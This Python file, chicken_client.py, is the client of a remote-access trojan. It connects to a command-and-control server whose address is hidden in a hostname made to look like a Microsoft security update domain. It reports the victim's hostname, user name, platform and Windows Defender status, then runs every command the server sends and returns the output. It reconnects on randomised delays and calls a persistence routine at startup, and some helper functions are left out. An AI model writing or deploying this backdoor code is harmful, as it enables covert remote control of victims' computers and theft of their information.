# chicken_client.py
import socket
import subprocess
import json
import os
import sys
import platform
import getpass
import shutil
import time
import threading
import random

# Configuration - WILL BE REPLACED BY BUILD SCRIPT
SPECIALIZED_HOST = 'YOUR_SPECIALIZED_IP'
REAL_HOST = 'YOUR_REAL_IP'
PORT = YOUR_PORT

def resolve_c2_server():
    """Resolve the real C2 server from specialized hostname"""
    try:
        if SPECIALIZED_HOST.startswith('update-') and '.microsoft-security.' in SPECIALIZED_HOST:
            # This is our specialized format, extract real IP
            parts = SPECIALIZED_HOST.split('.')
            for part in parts:
                if part.count('-') == 3:
                    return part.replace('-', '.'), PORT
    except:
        pass
    
    # Fallback to direct connection
    return REAL_HOST, PORT

def get_system_info():
    """Gather system information"""
    try:
        info = {
            "hostname": platform.node(),
            "user": getpass.getuser(),
            "platform": platform.platform(),
            "antivirus": get_antivirus_status()
        }
        return json.dumps(info)
    except:
        return json.dumps({"hostname": "Unknown", "user": "Unknown"})

def get_antivirus_status():
    """Check Windows Defender status"""
    try:
        result = subprocess.run(
            'powershell Get-MpComputerStatus',
            capture_output=True, text=True, shell=True
        )
        if 'Enabled' in result.stdout:
            return "Windows Defender Enabled"
        return "No AV Detected"
    except:
        return "Unknown"

# ... [Rest of client functions same as before] ...

def main():
    c2_host, c2_port = resolve_c2_server()
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((c2_host, c2_port))
            
            # Send system info
            s.send(get_system_info().encode('utf-8'))
            
            # Main command loop
            while True:
                cmd = s.recv(4096).decode('utf-8').strip()
                if not cmd:
                    break
                
                output, kill = execute_command(cmd)
                s.send(output.encode('utf-8'))
                
                if kill:
                    s.close()
                    sys.exit(0)
                    
        except Exception as e:
            time.sleep(30 + random.randint(0, 30))
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    establish_persistence()
    main()